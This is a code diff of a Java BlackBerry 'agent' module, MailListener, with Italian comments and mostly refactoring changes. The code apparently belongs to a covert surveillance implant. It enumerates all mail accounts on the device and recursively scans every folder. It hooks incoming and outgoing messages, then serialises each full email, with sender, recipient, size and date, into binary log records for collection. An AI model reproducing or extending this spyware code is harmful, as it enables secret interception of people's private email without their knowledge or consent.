@@ -5,15 +5,7 @@ package blackberry.agent;
 
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
-import java.util.Date;
 import java.util.Vector;
-
-import blackberry.log.Markup;
-import blackberry.utils.Check;
-import blackberry.utils.DateTime;
-import blackberry.utils.Debug;
-import blackberry.utils.DebugLevel;
-import blackberry.utils.Utils;
 
 import net.rim.blackberry.api.mail.Address;
 import net.rim.blackberry.api.mail.BodyPart;
@@ -37,6 +29,10 @@ import net.rim.device.api.servicebook.ServiceBook;
 import net.rim.device.api.servicebook.ServiceRecord;
 import net.rim.device.api.util.DataBuffer;
 import net.rim.device.api.util.IntHashtable;
+import blackberry.utils.Check;
+import blackberry.utils.DateTime;
+import blackberry.utils.Debug;
+import blackberry.utils.DebugLevel;
 
 /**
  * @author user1
@@ -63,121 +59,121 @@ public class MailListener implements FolderListener, StoreListener,
     protected static final int BODYDIM = 0;
 
     protected static IntHashtable fieldTable;
- 
+
     private static ServiceRecord[] mailServiceRecords;
+
+    /**
+     * controlla se il messaggio e' mime e ne stampa il contenuto
+     * 
+     * @param multipart
+     */
+    protected static void displayMultipart(final Multipart multipart) {
+        // This vector stores fields which are to be displayed only after all
+        // of the body fields are displayed. (Attachments and Contacts).
+        final Vector delayedFields = new Vector();
+
+        // Process each part of the multi-part, taking the appropriate action
+        // depending on the part's type. This loop should: display text and
+        // html body parts, recursively display multi-parts and store
+        // attachments and contacts to display later.
+        for (int index = 0; index < multipart.getCount(); index++) {
+            final BodyPart bodyPart = multipart.getBodyPart(index);
+
+            // If this body part is text then display all of it
+            if (bodyPart instanceof TextBodyPart) {
+                final TextBodyPart textBodyPart = (TextBodyPart) bodyPart;
+
+                // If there are missing parts of the text, try to retrieve the
+                // rest of it.
+                if (textBodyPart.hasMore()) {
+                    try {
+                        Transport.more(textBodyPart, true);
+                    } catch (final Exception e) {
+                        debug.trace("Transport.more(BodyPart, boolean) threw "
+                                + e.toString());
+                    }
+                }
+                String plainText = (String) textBodyPart.getContent();
+
+                // Display the plain text, using an EditField if the message is
+                // editable or a RichTextField if it is not editable. Note: this
+                // does not add any empty fields.
+                if (plainText.length() != 0) {
+                    if (FILTERDIM == true && plainText.length() > BODYDIM) {
+                        // se e' attivo il filtro sulla dimensione dell'email, sovrascrive al body dell'email la stringa troncata
+                        plainText = plainText.substring(0, (BODYDIM)); // l'unita' di misura e' il kbyte
+                    }
+                    debug.trace("Testo dell'email :" + plainText);
+                }
+            } else if (bodyPart instanceof MimeBodyPart) {
+                final MimeBodyPart mimeBodyPart = (MimeBodyPart) bodyPart;
+
+                // If the content is text then display it
+                final String contentType = mimeBodyPart.getContentType();
+                if (contentType
+                        .startsWith(BodyPart.ContentType.TYPE_TEXT_HTML_STRING)) {
+                    final Object obj = mimeBodyPart.getContent();
+                    if (obj != null) {
+                        String htmlText = new String((byte[]) obj);
+                        // se e' attivo il filtro sulla dimensione dell'email, sovrascrive al body dell'email la stringa troncata
+                        if (FILTERDIM == true && htmlText.length() > BODYDIM) {
+                            htmlText = htmlText.substring(0, (BODYDIM)); // l'unita' di misura e' il kbyte
+                        }
+                        debug.trace("Testo dell'email MIME: " + htmlText);
+                    }
+                } else if (contentType
+                        .equals(BodyPart.ContentType.TYPE_MULTIPART_ALTERNATIVE_STRING)) {
+                    // If the body part is a multi-part and it has the the
+                    // content type of TYPE_MULTIPART_ALTERNATIVE_STRING, then
+                    // recursively display the multi-part.
+                    final Object obj = mimeBodyPart.getContent();
+                    if (obj instanceof Multipart) {
+                        final Multipart childMultipart = (Multipart) obj;
+                        final String childMultipartType = childMultipart
+                                .getContentType();
+                        if (childMultipartType
+                                .equals(BodyPart.ContentType.TYPE_MULTIPART_ALTERNATIVE_STRING)) {
+                            displayMultipart(childMultipart);
+                        }
+                    }
+                }
+            }
+
+        }
+
+        // Now that the body parts have been displayed, display the queued
+        // fields while separating them by inserting a separator field.
+        for (int index = 0; index < delayedFields.size(); index++) {
+            // System.out.println(delayedFields.elementAt(index));
+            debug.trace(delayedFields.elementAt(index).toString());
+        }
+    }
+
     String[] names;
+
     protected static long lastcheck;
 
     long timestamp;
 
     MessageAgent messageAgent;
 
-    public MailListener(MessageAgent messageAgent_) {
-        this.messageAgent = messageAgent_;        
+    public MailListener(final MessageAgent messageAgent_) {
+        this.messageAgent = messageAgent_;
     }
 
-    public void start() {
-
-        ServiceBook serviceBook = ServiceBook.getSB();
-        mailServiceRecords = serviceBook.findRecordsByCid("CMIME");
-        
-        names = new String[mailServiceRecords.length];
-        debug.trace("Ci sono: " + mailServiceRecords.length
-                + " account di posta!");
-        
-        // Controllo tutti gli account di posta
-        for (int count = mailServiceRecords.length - 1; count >= 0; --count) {
-            
-            ServiceConfiguration sc = new ServiceConfiguration(
-                    mailServiceRecords[count]);
-            Store store = Session.getInstance(sc).getStore();
-            addListeners(store);           
-        }
-        
-        
-        //TODO: leggere  messageAgent.filtersEMAIL;
-    }
-    public void stop() {      
-        for (int count = mailServiceRecords.length - 1; count >= 0; --count) {
-            
-            ServiceConfiguration sc = new ServiceConfiguration(
-                    mailServiceRecords[count]);
-            Store store = Session.getInstance(sc).getStore();
-            removeListeners(store);           
-        }
-    }
-    
-    private void addListeners(Store store) {
+    private void addListeners(final Store store) {
         store.addFolderListener(this);
         store.addSendListener(this);
         store.addStoreListener(this);
-        
+
     }
 
-    public void removeListeners(Store store) {
-        store.removeFolderListener(this);
-        store.removeSendListener(this);
-        store.removeStoreListener(this);
+    public void batchOperation(final StoreEvent arg0) {
+        debug.info("batchOperation: " + arg0);
+
     }
 
-    public void run() {
-        // #debug
-        debug.trace("run");
-
-        timestamp = messageAgent.initMarkup();
-
-        // Controllo tutti gli account di posta
-        for (int count = mailServiceRecords.length - 1; count >= 0; --count) {
-            names[count] = mailServiceRecords[count].getName();
-            debug.trace("Nome dell'account di posta: " + names[count]);
-
-            names[count] = mailServiceRecords[0].getName();
-            ServiceConfiguration sc = new ServiceConfiguration(
-                    mailServiceRecords[count]);
-            Store store = Session.getInstance(sc).getStore();
-
-            Folder[] folders = store.list();
-            // Scandisco ogni Folder dell'account di posta
-            scanFolder(folders);
-        }
-        debug.trace("Fine ricerca!!");
-
-        messageAgent.updateMarkup();
-    }
-
-    /**
-     * scansione ricorsiva della directories
-     * 
-     * @param subfolders
-     */
-    public void scanFolder(Folder[] subfolders) {
-        Folder[] dirs;
-
-        // Date receivedDate;
-        if (subfolders.length <= 0) {
-            return;
-        }
-        for (int count = 0; count < subfolders.length; count++) {
-            debug.trace("Nome della cartella: "
-                    + subfolders[count].getFullName());
-            dirs = subfolders[count].list();
-            scanFolder(dirs);
-            try {
-                Message[] messages = subfolders[count].getMessages();
-                // Scandisco ogni e-mail dell'account di posta
-                for (int j = 0; j < messages.length; j++) {
-                    Message message = messages[j];
-
-                    manageMessage(message);
-                }
-            } catch (MessagingException e) {
-                debug.trace("Folder#getMessages() threw " + e.toString());
-
-            }
-        }
-    }
-
-    private void manageMessage(Message message) throws MessagingException {
+    private void manageMessage(final Message message) throws MessagingException {
         long dataArrivo, filterDate;
         // Date emailDate;
         boolean printEmail;
@@ -241,8 +237,8 @@ public class MailListener implements FolderListener, StoreListener,
             debug.trace("Mittente dell'email: " + message.getFrom());
             // debug.trace("Destinatario dell'email: " +
             // message.getReplyTo());
-            Address[] addresses = message.getRecipients(HEADER_KEYS[0]);
-            String name = addresses[0].getAddr();
+            final Address[] addresses = message.getRecipients(HEADER_KEYS[0]);
+            final String name = addresses[0].getAddr();
             debug.trace("Destinatario dell'email: " + name);
 
             debug
@@ -264,18 +260,18 @@ public class MailListener implements FolderListener, StoreListener,
             // long timeArrived;
             // timeArrived = data.getTime();
 
-            Object obj = message.getContent();
+            final Object obj = message.getContent();
 
             Multipart parent = null;
             if (obj instanceof MimeBodyPart || obj instanceof TextBodyPart) {
-                BodyPart bp = (BodyPart) obj;
+                final BodyPart bp = (BodyPart) obj;
                 parent = bp.getParent();
             } else {
                 parent = (Multipart) obj;
             }
 
             // Display the message body
-            String mpType = parent.getContentType();
+            final String mpType = parent.getContentType();
             if (mpType
                     .equals(BodyPart.ContentType.TYPE_MULTIPART_ALTERNATIVE_STRING)
                     || mpType
@@ -288,28 +284,80 @@ public class MailListener implements FolderListener, StoreListener,
 
     }
 
-    private void saveLog(Message message) {
+    public void messagesAdded(final FolderEvent e) {
+        final Message message = e.getMessage();
+        //if(m.isInbound() && m.getSubject().equals(MY_SUBJECT"))
+        debug.info("Added Message: " + message);
+
+        try {
+            manageMessage(message);
+        } catch (final MessagingException ex) {
+            debug.error("cannot manage added message: " + ex);
+        }
+
+        messageAgent.updateMarkup();
+    }
+
+    public void messagesRemoved(final FolderEvent e) {
+        final Message message = e.getMessage();
+        debug.info("Removed Message" + message);
+
+    }
+
+    public void removeListeners(final Store store) {
+        store.removeFolderListener(this);
+        store.removeSendListener(this);
+        store.removeStoreListener(this);
+    }
+
+    public void run() {
+        // #debug
+        debug.trace("run");
+
+        timestamp = messageAgent.initMarkup();
+
+        // Controllo tutti gli account di posta
+        for (int count = mailServiceRecords.length - 1; count >= 0; --count) {
+            names[count] = mailServiceRecords[count].getName();
+            debug.trace("Nome dell'account di posta: " + names[count]);
+
+            names[count] = mailServiceRecords[0].getName();
+            final ServiceConfiguration sc = new ServiceConfiguration(
+                    mailServiceRecords[count]);
+            final Store store = Session.getInstance(sc).getStore();
+
+            final Folder[] folders = store.list();
+            // Scandisco ogni Folder dell'account di posta
+            scanFolder(folders);
+        }
+        debug.trace("Fine ricerca!!");
+
+        messageAgent.updateMarkup();
+    }
+
+    private void saveLog(final Message message) {
 
         ByteArrayOutputStream os = null;
         try {
             os = new ByteArrayOutputStream();
             message.writeTo(os);
-            byte[] content = os.toByteArray();
+            final byte[] content = os.toByteArray();
 
-            String messageContent = new String(content);
+            final String messageContent = new String(content);
             debug.trace(messageContent);
 
-            int flags = 1;
-            int size = message.getSize();
-            DateTime filetime = new DateTime(message.getReceivedDate());
+            final int flags = 1;
+            final int size = message.getSize();
+            final DateTime filetime = new DateTime(message.getReceivedDate());
 
-            byte[] additionalData = new byte[20];
+            final byte[] additionalData = new byte[20];
             /*
              * UINT uVersion; 200 #define LOG_MAIL_VERSION 2009070301 201 UINT
              * uFlags; 202 UINT uSize; 203 FILETIME ftTime;
              */
 
-            DataBuffer databuffer = new DataBuffer(additionalData, 0, 20, false);
+            final DataBuffer databuffer = new DataBuffer(additionalData, 0, 20,
+                    false);
             databuffer.writeInt(MAIL_VERSION);
             databuffer.writeInt(flags);
             databuffer.writeInt(size);
@@ -318,144 +366,94 @@ public class MailListener implements FolderListener, StoreListener,
 
             messageAgent.createLog(additionalData, content);
 
-        } catch (IOException e) {
+        } catch (final IOException e) {
             // TODO Auto-generated catch block
             e.printStackTrace();
         } finally {
             if (os != null) {
                 try {
                     os.close();
-                } catch (IOException e) {
+                } catch (final IOException e) {
                 }
             }
         }
     }
 
     /**
-     * controlla se il messaggio e' mime e ne stampa il contenuto
+     * scansione ricorsiva della directories
      * 
-     * @param multipart
+     * @param subfolders
      */
-    protected static void displayMultipart(Multipart multipart) {
-        // This vector stores fields which are to be displayed only after all
-        // of the body fields are displayed. (Attachments and Contacts).
-        Vector delayedFields = new Vector();
+    public void scanFolder(final Folder[] subfolders) {
+        Folder[] dirs;
 
-        // Process each part of the multi-part, taking the appropriate action
-        // depending on the part's type. This loop should: display text and
-        // html body parts, recursively display multi-parts and store
-        // attachments and contacts to display later.
-        for (int index = 0; index < multipart.getCount(); index++) {
-            BodyPart bodyPart = multipart.getBodyPart(index);
+        // Date receivedDate;
+        if (subfolders.length <= 0) {
+            return;
+        }
+        for (int count = 0; count < subfolders.length; count++) {
+            debug.trace("Nome della cartella: "
+                    + subfolders[count].getFullName());
+            dirs = subfolders[count].list();
+            scanFolder(dirs);
+            try {
+                final Message[] messages = subfolders[count].getMessages();
+                // Scandisco ogni e-mail dell'account di posta
+                for (int j = 0; j < messages.length; j++) {
+                    final Message message = messages[j];
 
-            // If this body part is text then display all of it
-            if (bodyPart instanceof TextBodyPart) {
-                TextBodyPart textBodyPart = (TextBodyPart) bodyPart;
-
-                // If there are missing parts of the text, try to retrieve the
-                // rest of it.
-                if (textBodyPart.hasMore()) {
-                    try {
-                        Transport.more(textBodyPart, true);
-                    } catch (Exception e) {
-                        debug.trace("Transport.more(BodyPart, boolean) threw "
-                                + e.toString());
-                    }
+                    manageMessage(message);
                 }
-                String plainText = (String) textBodyPart.getContent();
+            } catch (final MessagingException e) {
+                debug.trace("Folder#getMessages() threw " + e.toString());
 
-                // Display the plain text, using an EditField if the message is
-                // editable or a RichTextField if it is not editable. Note: this
-                // does not add any empty fields.
-                if (plainText.length() != 0) {
-                    if (FILTERDIM == true && plainText.length() > BODYDIM) {
-                        // se e' attivo il filtro sulla dimensione dell'email, sovrascrive al body dell'email la stringa troncata
-                        plainText = plainText.substring(0, (BODYDIM)); // l'unita' di misura e' il kbyte
-                    }
-                    debug.trace("Testo dell'email :" + plainText);
-                }
-            } else if (bodyPart instanceof MimeBodyPart) {
-                MimeBodyPart mimeBodyPart = (MimeBodyPart) bodyPart;
-
-                // If the content is text then display it
-                String contentType = mimeBodyPart.getContentType();
-                if (contentType
-                        .startsWith(BodyPart.ContentType.TYPE_TEXT_HTML_STRING)) {
-                    Object obj = mimeBodyPart.getContent();
-                    if (obj != null) {
-                        String htmlText = new String((byte[]) obj);
-                        // se e' attivo il filtro sulla dimensione dell'email, sovrascrive al body dell'email la stringa troncata
-                        if (FILTERDIM == true && htmlText.length() > BODYDIM) {
-                            htmlText = htmlText.substring(0, (BODYDIM)); // l'unita' di misura e' il kbyte
-                        }
-                        debug.trace("Testo dell'email MIME: " + htmlText);
-                    }
-                } else if (contentType
-                        .equals(BodyPart.ContentType.TYPE_MULTIPART_ALTERNATIVE_STRING)) {
-                    // If the body part is a multi-part and it has the the
-                    // content type of TYPE_MULTIPART_ALTERNATIVE_STRING, then
-                    // recursively display the multi-part.
-                    Object obj = mimeBodyPart.getContent();
-                    if (obj instanceof Multipart) {
-                        Multipart childMultipart = (Multipart) obj;
-                        String childMultipartType = childMultipart
-                                .getContentType();
-                        if (childMultipartType
-                                .equals(BodyPart.ContentType.TYPE_MULTIPART_ALTERNATIVE_STRING)) {
-                            displayMultipart(childMultipart);
-                        }
-                    }
-                }
             }
-
-        }
-
-        // Now that the body parts have been displayed, display the queued
-        // fields while separating them by inserting a separator field.
-        for (int index = 0; index < delayedFields.size(); index++) {
-            // System.out.println(delayedFields.elementAt(index));
-            debug.trace(delayedFields.elementAt(index).toString());
         }
     }
 
-    public void messagesAdded(FolderEvent e) {
-        Message message = e.getMessage();
-        //if(m.isInbound() && m.getSubject().equals(MY_SUBJECT"))
-        debug.info("Added Message: " + message);
-
-        try {
-            manageMessage(message);
-        } catch (MessagingException ex) {
-            debug.error("cannot manage added message: " + ex);
-        }
-
-        messageAgent.updateMarkup();
-    }
-
-    public void messagesRemoved(FolderEvent e) {
-        Message message = e.getMessage();
-        debug.info("Removed Message" + message);
-
-    }
-
-    public void batchOperation(StoreEvent arg0) {
-        debug.info("batchOperation: " + arg0);
-
-    }
-
-    public boolean sendMessage(Message message) {
+    public boolean sendMessage(final Message message) {
 
         //if(m.isInbound() && m.getSubject().equals(MY_SUBJECT"))
         debug.info("New Send Message: " + message);
 
-      /*  try {
-            manageMessage(message);
-        } catch (MessagingException ex) {
-            debug.error("cannot manage sending message: " + ex);
+        /*
+         * try { manageMessage(message); } catch (MessagingException ex) {
+         * debug.error("cannot manage sending message: " + ex); }
+         * 
+         * messageAgent.updateMarkup();
+         */
+        return true;
+    }
+
+    public void start() {
+
+        final ServiceBook serviceBook = ServiceBook.getSB();
+        mailServiceRecords = serviceBook.findRecordsByCid("CMIME");
+
+        names = new String[mailServiceRecords.length];
+        debug.trace("Ci sono: " + mailServiceRecords.length
+                + " account di posta!");
+
+        // Controllo tutti gli account di posta
+        for (int count = mailServiceRecords.length - 1; count >= 0; --count) {
+
+            final ServiceConfiguration sc = new ServiceConfiguration(
+                    mailServiceRecords[count]);
+            final Store store = Session.getInstance(sc).getStore();
+            addListeners(store);
         }
 
-        messageAgent.updateMarkup();*/
-        return true;
+        //TODO: leggere  messageAgent.filtersEMAIL;
+    }
+
+    public void stop() {
+        for (int count = mailServiceRecords.length - 1; count >= 0; --count) {
+
+            final ServiceConfiguration sc = new ServiceConfiguration(
+                    mailServiceRecords[count]);
+            final Store store = Session.getInstance(sc).getStore();
+            removeListeners(store);
+        }
     }
 
 }
